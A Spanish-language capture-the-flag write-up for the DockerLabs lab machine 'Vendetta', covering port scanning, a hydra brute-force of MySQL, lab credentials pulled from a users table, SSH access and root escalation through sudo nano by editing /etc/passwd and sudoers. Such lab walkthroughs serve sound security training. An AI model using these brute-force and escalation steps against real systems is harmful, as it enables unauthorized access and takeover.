---
title: Vendetta - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | Luisillo_o        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/3161e1b3-988e-4e4d-a354-fddfe1590da6)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)
- `22` (SSH)
- `3306` (Mysql)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80,3306 -sCV 172.17.0.2 -oG targeted 
```
![image](https://github.com/user-attachments/assets/b1e44dfc-dde2-400d-bbe4-3ef4d940bf05)

# Exploración Web
Al navegar al puerto `80`, descubrimos un sitio web con el titulo de `V de vendetta`.

![image](https://github.com/user-attachments/assets/ed88e3f9-411d-475b-8246-d6eb2088d117)

Solo vemos dos imagenes en las cuales pone **"Visible pero a la Vez oculto,si sabes su nombre sabes todo"**

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/c3203ae4-dff2-4938-a70c-28346f56dc1d)

Probando varias metodos vemos que lo que destaca en negrita es la letra `V` asi que sabiendo que tenemos dos servicios lo consegui en myslq de la siguiente forma:

```bash
hydra -l V -P worlist.txt mysql://172.17.0.2 -t 4 
```
![image](https://github.com/user-attachments/assets/3ec24864-cedb-4769-a82b-7aec8eebf063)

Accedemos a la base de datos.
```
mysql -h 172.17.0.2 -u V -p
```
Ponemos la contarseña , pero parece que tenemos un error de **ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it**, por lo que le añadimos las siguientes lineas.
```bash
mysql -h 172.17.0.2 -u V -p --skip-ssl
```
Ahora que estamos dentro vamos a ver que contiene dentro.
![image](https://github.com/user-attachments/assets/235c661c-5d8d-4b30-a7d6-8d4d3023b288)

Lo primero que base de datos tiene:
```mysql
show databases;
```
![image](https://github.com/user-attachments/assets/92435461-d8d6-433e-a006-4441dd6cd149)

Entramos en la base de datos `BTN`:
```mysql
use BTN;
```
![image](https://github.com/user-attachments/assets/34533b8b-2a9d-44e7-b11d-f0fcf089ef5b)

Vemos las tablas que contiene:
```mysql
show tables;
```
![image](https://github.com/user-attachments/assets/6e1721e7-a5be-4d93-bea7-f5888ab06fce)

Ahora veremos que contiene la tabla usuarios:
```mysql
select * from users;
```
![image](https://github.com/user-attachments/assets/df32a20d-f226-49b7-bcf1-cdc5565b4826)

Tenemos un usuario y una contraseña:
```mysql
+----+----------+-----------+
| id | user     | password  |
+----+----------+-----------+
|  1 | Vendetta | OldBailey |
+----+----------+-----------+
```
Vamos a porbar si se puede desde `ssh`.
```bash
ssh Vendetta@172.17.0.2
```
![image](https://github.com/user-attachments/assets/9c4102cd-6ed1-452f-9a9c-3ddf80984b47)

Al ejecutar `sudo -l`, notamos que tiene permisos para ejecutar `nano` como `root`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

Para ello lo podemos de hacer de varias formas:

Modificando el /etc/passwd:

Para ello le quitaremos la `x` al usuario root, asi no nos pedira contraseña al acceder.

![image](https://github.com/user-attachments/assets/30e7c575-0d9e-472f-a46c-63a9aaa5363f)

Ya seriamos root.

![image](https://github.com/user-attachments/assets/b8d76667-2071-4206-b369-48d35097e60f)

Otra forma seria modifcando el /etc/sudores para darnos permiso de root al usuario vendetta.

![image](https://github.com/user-attachments/assets/fddefb38-9e29-4762-af72-b37fa64530c3)

![image](https://github.com/user-attachments/assets/c8f5a24f-94e9-470e-b7b3-e5247631f368)


Y la ultima seria generar una shell con nano.

![image](https://github.com/user-attachments/assets/cc540a1e-c90a-4fce-bed9-0b78294cd7f7)

